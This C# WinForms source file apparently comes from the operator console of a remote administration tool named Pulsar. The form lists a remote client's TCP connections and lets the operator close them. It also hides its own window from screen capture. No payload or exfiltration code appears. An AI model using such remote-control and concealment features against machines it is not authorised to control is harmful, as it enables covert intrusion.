using Pulsar.Common.Messages;
using Pulsar.Common.Models;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Net;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmConnections : Form
    {
        private readonly Client _connectClient;
        private readonly TcpConnectionsHandler _connectionsHandler;
        private readonly Dictionary<string, ListViewGroup> _groups = new();
        private static readonly Dictionary<Client, FrmConnections> OpenedForms = new();

        // Store client's local IP and port for highlight comparison
        private readonly string _clientAddress;
        private readonly int _clientPort;

        public static FrmConnections CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
                return OpenedForms[client];

            FrmConnections f = new(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        public FrmConnections(Client client)
        {
            _connectClient = client;
            _connectionsHandler = new TcpConnectionsHandler(client);

            // Safely parse the endpoint info if available
            // Adjust these lines if your Client model uses different properties (like client.IP)
            var endPoint = client.EndPoint as IPEndPoint;
            if (endPoint != null)
            {
                _clientAddress = endPoint.Address.ToString();
                _clientPort = endPoint.Port;
            }
            else
            {
                _clientAddress = string.Empty;
                _clientPort = -1;
            }

            RegisterMessageHandler();
            InitializeComponent();

            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
        }

        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _connectionsHandler.ProgressChanged += TcpConnectionsChanged;
            MessageHandler.Register(_connectionsHandler);
        }

        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_connectionsHandler);
            _connectionsHandler.ProgressChanged -= TcpConnectionsChanged;
            _connectClient.ClientState -= ClientDisconnected;
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
                this.Invoke((MethodInvoker)this.Close);
        }

        private void TcpConnectionsChanged(object sender, TcpConnection[] connections)
        {
            if (InvokeRequired)
            {
                Invoke(new Action<object, TcpConnection[]>(TcpConnectionsChanged), sender, connections);
                return;
            }

            lstConnections.BeginUpdate();
            lstConnections.Items.Clear();

            foreach (var con in connections)
            {
                string state = con.State.ToString();

                ListViewItem lvi = new(new[]
                {
                    con.ProcessName,
                    con.LocalAddress,
                    con.LocalPort.ToString(),
                    con.RemoteAddress,
                    con.RemotePort.ToString(),
                    state
                });

                // ✅ Highlight the row matching this client's IP and Port
                // ✅ Softer green highlight for client's own connection
                if (!string.IsNullOrEmpty(_clientAddress) &&
                    string.Equals(con.LocalAddress, _clientAddress, StringComparison.OrdinalIgnoreCase) &&
                    con.LocalPort == _clientPort)
                {
                    lvi.BackColor = Color.MediumSeaGreen; // softer lime tone
                    lvi.ForeColor = Color.White;
                    lvi.Font = new Font(lstConnections.Font, FontStyle.Bold);
                }


                if (!_groups.ContainsKey(state))
                {
                    ListViewGroup g = new(state, state);
                    lstConnections.Groups.Add(g);
                    _groups.Add(state, g);
                }

                lvi.Group = lstConnections.Groups[state];
                lstConnections.Items.Add(lvi);
            }

            lstConnections.EndUpdate();
        }

        private void FrmConnections_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Connections", _connectClient);
            _connectionsHandler.RefreshTcpConnections();
        }

        private void FrmConnections_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectionsHandler.RefreshTcpConnections();
        }

        private void closeConnectionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            bool modified = false;

            foreach (ListViewItem lvi in lstConnections.SelectedItems)
            {
                _connectionsHandler.CloseTcpConnection(
                    lvi.SubItems[1].Text,
                    ushort.Parse(lvi.SubItems[2].Text),
                    lvi.SubItems[3].Text,
                    ushort.Parse(lvi.SubItems[4].Text));

                modified = true;
            }

            if (modified)
                _connectionsHandler.RefreshTcpConnections();
        }

        private void lstConnections_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            lstConnections.LvwColumnSorter.NeedNumberCompare = (e.Column == 2 || e.Column == 4);
        }
    }
}
